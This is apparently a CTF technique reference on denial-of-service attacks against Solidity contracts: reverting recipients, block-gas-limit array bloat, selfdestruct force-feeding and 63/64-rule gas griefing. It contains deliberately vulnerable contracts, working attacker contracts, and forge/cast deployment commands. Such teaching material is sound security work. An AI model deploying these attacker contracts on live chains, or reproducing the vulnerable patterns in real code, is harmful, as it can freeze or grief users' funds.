---
title: "Gas and Denial of Service - Unbounded Loops, Griefing and Force-Fed Ether"
category: blockchain
subcategory: dos
type: technique
tags: [blockchain, dos, gas, gas-griefing, unbounded-loop, selfdestruct, force-feed, block-gaslimit, push-payment, pull-payment, revert, out-of-gas, 63-64-rule, returndatasize, solidity, evm, foundry]
difficulty: medium
summary: "Make a required call fail forever: revert in a callback, blow the block gas limit, or force ether in so a strict balance check never holds again."
when_to_use:
  - "A loop iterates over an array anyone can grow"
  - "A payout loop uses .transfer/.send to addresses users control"
  - "A contract requires address(this).balance == some exact value"
  - "isSolved() means 'the contract is stuck' or 'nobody else can win'"
tools: [foundry, cast, forge]
related: [reentrancy, integer-overflow, attacker-contract-patterns, solidity-vuln-checklist]
---

## TL;DR

Four independent primitives: (1) a reverting recipient breaks a push-payment loop for everyone,
(2) an array you can grow makes a function exceed the block gas limit, (3) `selfdestruct` and
coinbase payments put ether into a contract that never accepted it, (4) the 63/64 rule lets you
starve a sub-call of gas while your own frame survives.

## Recognise it

- `for (uint i = 0; i < participants.length; i++) { participants[i].transfer(share); }`
- `address[] public queue;` with a `public` push and a loop somewhere over it.
- `require(address(this).balance == expected)` / `if (address(this).balance == 0.5 ether)`
- `require(this.balance % 1 ether == 0)`
- `msg.sender.call{gas: 2300}` or `.transfer()` to an unknown address in a required path.
- A contract with no `receive()`/`fallback()` that nonetheless asserts its balance is zero.
- `delete array` / `for` loop over a mapping's index list during `withdraw`.
- A "king of the hill" that refunds the previous king before replacing them.
- Unbounded `bytes`/`string` concatenation, or `abi.decode` of caller-supplied data with huge length.

## Theory

### 1. Push payments and the reverting recipient

If the contract *pushes* funds with `transfer`/`send`/`call` and `require`s success, a recipient
contract whose `receive()` reverts (or consumes all gas) makes the whole transaction revert. If
that recipient is in a loop, nobody gets paid, ever.

The fix is pull payments: credit a balance, let each user withdraw for themselves.

Note `transfer` forwards 2300 gas and bubbles the revert; `send` returns `false` (so an
unchecked `send` is a *different* bug); `call` forwards all gas by default.

### 2. Block gas limit

An Ethereum block has a gas limit (~30M on mainnet; configurable on a dev chain). A transaction
that needs more gas than the limit **can never be mined**. Growing an array to N elements where
the per-element cost times N exceeds the limit permanently bricks any function that iterates it.
Cheap to do: `SSTORE` of a new array element is 22100 gas cold, so ~1300 elements per 30M-gas
transaction, and you can use many transactions.

### 3. Force-feeding ether

A contract cannot refuse ether from:

- **`selfdestruct(payable(target))`** - sends the balance with no code execution at the target
  (still true post-EIP-6780: the balance transfer happens even though the code is no longer
  deleted).
- **Being the `block.coinbase`** - mining/validator rewards.
- **Pre-computed address funding** - send ether to an address *before* the contract is deployed
  there (`CREATE2` makes this deterministic); the balance is already in the account when the code
  lands.

So `address(this).balance` is never a reliable accounting variable, and any `==` comparison on it
is breakable.

### 4. The 63/64 rule (EIP-150) and gas griefing

When A calls B, B receives at most `63/64` of A's remaining gas; A always retains `1/64`. So an
attacker who controls the *outer* gas limit can give a sub-call just enough to fail while the outer
frame has enough left to continue past an unchecked `bool ok`. This turns "the relayer forwarded my
meta-transaction" into "the relayer marked it done but it never executed".

### 5. `returndatasize` memory bomb

`(bool ok, bytes memory ret) = target.call(...)` copies the entire return data into memory. A
malicious callee returning megabytes makes memory expansion cost quadratic and burns the caller's
gas. Mitigated by using assembly `call` and ignoring return data, or `ExcessivelySafeCall`.

## Attack

1. Find the required path: what must succeed for the challenge to progress?
2. Pick the primitive:
   - a recipient you control in a loop -> revert in `receive()`
   - an array you can grow -> spam entries
   - a strict balance equality -> `selfdestruct` into it
   - an unchecked sub-call -> supply a tight gas limit
3. Confirm the target function now reverts / is unreachable.

## Code

### Vulnerable contracts

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Auction {
    address public currentLeader;
    uint256 public highestBid;

    /// BUG: refunds the previous leader with a push payment
    function bid() external payable {
        require(msg.value > highestBid, "bid too low");
        if (currentLeader != address(0)) {
            payable(currentLeader).transfer(highestBid);   // reverts -> nobody can outbid
        }
        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}

contract Payout {
    address[] public participants;
    mapping(address => bool) public joined;

    /// BUG: anyone can grow the array without bound
    function join() external payable {
        require(msg.value == 0.01 ether, "entry fee");
        require(!joined[msg.sender], "already joined");
        joined[msg.sender] = true;
        participants.push(msg.sender);
    }

    /// BUG: unbounded loop + push payments
    function distribute() external {
        uint256 share = address(this).balance / participants.length;
        for (uint256 i = 0; i < participants.length; i++) {
            (bool ok, ) = participants[i].call{value: share}("");
            require(ok, "payout failed");
        }
    }

    function count() external view returns (uint256) {
        return participants.length;
    }
}

contract ExactBalanceGame {
    /// BUG: address(this).balance can be increased without calling deposit()
    function deposit() external payable {
        require(msg.value == 1 ether, "1 ether only");
        require(address(this).balance <= 7 ether, "game over");
    }

    function isSolved() external view returns (bool) {
        return address(this).balance == 7 ether;   // force-feed 1 wei -> unreachable forever
    }
}
```

### Attacker 1 - reverting recipient

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IAuction {
    function bid() external payable;
}

/// Bid once from this contract; every later bidder's refund to us reverts,
/// so we stay the leader permanently.
contract StickyBidder {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function bid(address auction) external payable {
        IAuction(auction).bid{value: msg.value}();
    }

    // refuse all incoming ether -> the auction's transfer() reverts
    receive() external payable {
        revert("no refunds");
    }
}
```

A gentler variant that burns gas instead of reverting (defeats `send`-based refunds too, and also
defeats `try/catch` because out-of-gas is not catchable in the child when the parent runs out):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract GasBurner {
    uint256 private junk;

    receive() external payable {
        // consume every bit of forwarded gas
        while (gasleft() > 0) {
            junk = junk + 1;
        }
    }
}
```

### Attacker 2 - force-feed ether with selfdestruct

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// Deploy WITH value, then immediately destroy: the balance lands on `target`
/// regardless of whether `target` has a receive()/fallback().
contract ForceFeeder {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}
```

```bash
# deploy-and-destroy in one transaction, sending 1 wei to the victim
forge create src/ForceFeeder.sol:ForceFeeder \
  --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY" \
  --value 1wei \
  --constructor-args "$TARGET"

# confirm the balance moved
cast balance "$TARGET" --rpc-url "$RPC_URL"
```

Pre-funding a `CREATE2` address (works even after EIP-6780 removed code deletion):

```bash
# 1) compute where the contract WILL be deployed
#    CREATE  (address depends on deployer + nonce)
ADDR=$(cast compute-address "$DEPLOYER" --nonce 5)
#    CREATE2 (address depends on factory + salt + init code hash)
INIT_HASH=$(cast keccak "$(cast code "$TEMPLATE" --rpc-url "$RPC_URL")")
cast create2 --deployer "$FACTORY" --salt "$SALT" --init-code-hash "$INIT_HASH"

# 2) send ether there before it exists
cast send "$ADDR" --value 1ether --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY"
```

### Attacker 3 - array bloat to blow the gas limit

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPayout {
    function join() external payable;
    function count() external view returns (uint256);
}

/// Each helper is a distinct address, so the victim's `joined` mapping does not
/// dedupe them. Deploy `n` of them per transaction until distribute() is unminable.
contract Bloater {
    IPayout public immutable target;

    constructor(address _target) payable {
        target = IPayout(_target);
    }

    function spam(uint256 n) external {
        for (uint256 i = 0; i < n; i++) {
            new Joiner{value: 0.01 ether}(address(target));
        }
    }

    receive() external payable {}
}

contract Joiner {
    constructor(address target) payable {
        IPayout(target).join{value: msg.value}();
    }

    receive() external payable {}
}
```

### Attacker 4 - gas griefing an unchecked sub-call

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IRelayer {
    /// Vulnerable shape: forwards a call but ignores whether it succeeded.
    function relay(address to, bytes calldata data) external;
}

/// Because of the 63/64 rule, if we give the outer call G gas, the inner call
/// receives at most 63G/64. Choose G so the inner call runs out but the outer
/// frame still has enough to finish and mark the message as delivered.
contract GriefRelayer {
    function grief(address relayer, address to, bytes calldata data, uint256 gasLimit) external {
        (bool ok, ) = relayer.call{gas: gasLimit}(
            abi.encodeCall(IRelayer.relay, (to, data))
        );
        require(ok, "outer frame must survive");
    }
}
```

### Foundry proof

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Auction} from "../src/Auction.sol";
import {StickyBidder} from "../src/StickyBidder.sol";

contract DosTest is Test {
    Auction auction;
    StickyBidder sticky;
    address honest = address(0xB0B);

    function setUp() public {
        auction = new Auction();
        sticky = new StickyBidder();
        vm.deal(address(this), 100 ether);
        vm.deal(honest, 100 ether);
    }

    function test_auctionIsBricked() public {
        sticky.bid{value: 1 ether}(address(auction));
        assertEq(auction.currentLeader(), address(sticky));

        vm.prank(honest);
        vm.expectRevert();               // refund to sticky reverts
        auction.bid{value: 2 ether}();

        assertEq(auction.currentLeader(), address(sticky));
    }
}
```

## Variants & pitfalls

- **`transfer` vs `send` vs `call`**: `transfer` reverts the caller, `send` returns `false`
  (an unchecked `send` silently loses the payment - that is a *funds loss* bug, not DoS), `call`
  forwards all gas and returns a bool.
- **`try/catch` does not save you from out-of-gas**: if the child consumes everything, the parent
  has only 1/64 left and usually cannot finish. `try/catch` does catch explicit `revert`s.
- **Post-EIP-6780 `selfdestruct`**: code is only deleted if the `SELFDESTRUCT` happens in the same
  transaction that created the contract. **The ether transfer still works either way**, so
  force-feeding is unaffected. Deploying a `ForceFeeder` whose constructor selfdestructs satisfies
  the same-transaction condition anyway.
- **`address(this).balance` in a constructor** already includes pre-sent ether.
- **Gas limits on a CTF chain** are often set absurdly high (`anvil --gas-limit 300000000`), which
  kills the array-bloat primitive. Check `cast block latest --field gasLimit`.
- **Storage refunds** (EIP-3529) cap at 20% of the transaction's gas, so "clear the array to get a
  refund" rescues much less than pre-London.
- **Griefing vs DoS in scoring**: many CTFs only care that `isSolved()` flips, so "nobody else can
  win" is a valid solve.
- **Sorted-insert loops**, `delete` of a large mapping-backed array, and `for` over an ERC721
  holder's token list are the same bug wearing different clothes.
- **Return-data bomb**: prefer `assembly { success := call(gas(), t, v, in, insize, 0, 0) }` when
  the return value is unused.

## Tools

- `forge test --gas-report`, `forge snapshot` to see which function is near the limit.
- `cast estimate <addr> "distribute()"` - if it reverts or exceeds the block limit, done.
- `cast block latest --field gasLimit` / `--field gasUsed`.
- `anvil --gas-limit` to reproduce a specific chain's constraint locally.

## References

- EIP-150 (the 63/64 rule), EIP-3529 (refund reduction), EIP-6780 (selfdestruct semantics).
- Solidity docs: "Security Considerations - Sending and Receiving Ether", "Gas Limit and Loops".
